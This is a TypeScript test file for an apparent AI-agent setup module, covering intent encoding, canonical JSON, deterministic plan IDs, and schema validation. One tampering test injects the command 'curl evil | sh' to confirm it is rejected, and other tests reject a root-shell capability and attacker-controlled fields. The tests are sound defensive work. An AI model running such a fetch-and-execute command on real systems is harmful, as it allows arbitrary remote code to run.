import { describe, expect, it } from "vitest";

import {
  canonicalJson,
  computeRecipeDigest,
  createSetupPlan,
  decodeSetupIntent,
  encodeSetupIntent,
  setupIntentSchema,
  setupPlanSchema,
  type InstallRecipe,
  type SetupIntent,
  type SetupPlanInput,
} from "./setup.js";

const intent: SetupIntent = {
  schemaVersion: 1,
  root: "/workspace/project",
  projectFingerprint: `sha256:${"1".repeat(64)}`,
  harness: "opencode",
  task: "Inspect this project",
  mode: "plan",
  requestedCapabilities: ["CODE_CONTEXT.semantic-search"],
  selectedSkills: [],
  selectionRationale: "No skill applies to this test",
};

const recipe: InstallRecipe = {
  kind: "npm",
  package: "@loom/example",
  version: "1.2.3",
  integrity: `sha512-${"A".repeat(86)}==`,
};

function planInput(): SetupPlanInput {
  return {
    schemaVersion: 1,
    root: "/workspace/project",
    projectFingerprint: `sha256:${"1".repeat(64)}`,
    harness: "opencode",
    task: "Inspect this project",
    mode: "plan",
    candidates: [
      {
        id: "example",
        capabilities: ["CODE_CONTEXT.semantic-search"],
        recipe,
        recipeDigest: computeRecipeDigest(recipe),
      },
    ],
    policyHash: `sha256:${"2".repeat(64)}`,
    inputHash: `sha256:${"3".repeat(64)}`,
    createdAt: "2026-08-24T10:00:00.000Z",
    expiresAt: "2026-08-24T10:15:00.000Z",
  };
}

describe("setup intent", () => {
  it("round trips through a deterministic opaque encoding", () => {
    const encoded = encodeSetupIntent(intent);
    expect(encoded).toMatch(/^loom1_[A-Za-z0-9_-]+$/);
    expect(encodeSetupIntent({ ...intent })).toBe(encoded);
    expect(decodeSetupIntent(encoded)).toEqual(intent);
  });

  it.each(["command", "url", "package", "env", "approval"])(
    "rejects the adversarial %s field",
    (field) => {
      expect(
        setupIntentSchema.safeParse({
          ...intent,
          [field]: "attacker-controlled",
        }).success,
      ).toBe(false);
    },
  );

  it("rejects unknown capabilities and malformed encodings", () => {
    expect(
      setupIntentSchema.safeParse({
        ...intent,
        selectedSkills: [],
        selectionRationale: undefined,
      }).success,
    ).toBe(false);
    expect(
      setupIntentSchema.safeParse({
        ...intent,
        requestedCapabilities: ["OPS.root-shell"],
      }).success,
    ).toBe(false);
    expect(() => decodeSetupIntent("loom1_%%%")).toThrow(
      "Invalid setup intent encoding",
    );
    expect(() => decodeSetupIntent("loom2_e30")).toThrow(
      "Invalid setup intent encoding",
    );
  });
});

describe("canonical setup plans", () => {
  it("sorts object keys recursively and preserves array order", () => {
    expect(canonicalJson({ z: 1, a: { d: 2, b: 1 }, c: [3, 2] })).toBe(
      '{"a":{"b":1,"d":2},"c":[3,2],"z":1}',
    );
  });

  it("computes a deterministic plan id", () => {
    const first = createSetupPlan(planInput());
    const reordered = {
      ...planInput(),
      candidates: planInput().candidates.map((candidate) => ({
        recipeDigest: candidate.recipeDigest,
        recipe: candidate.recipe,
        capabilities: candidate.capabilities,
        id: candidate.id,
      })),
    };
    expect(createSetupPlan(reordered).planId).toBe(first.planId);
  });

  it("rejects plan and recipe tampering", () => {
    const plan = createSetupPlan(planInput());
    expect(
      setupPlanSchema.safeParse({ ...plan, harness: "codex" }).success,
    ).toBe(false);
    expect(
      setupPlanSchema.safeParse({
        ...plan,
        candidates: [
          { ...plan.candidates[0], recipe: { ...recipe, version: "1.2.4" } },
        ],
      }).success,
    ).toBe(false);
    expect(
      setupPlanSchema.safeParse({ ...plan, command: "curl evil | sh" }).success,
    ).toBe(false);
  });
});
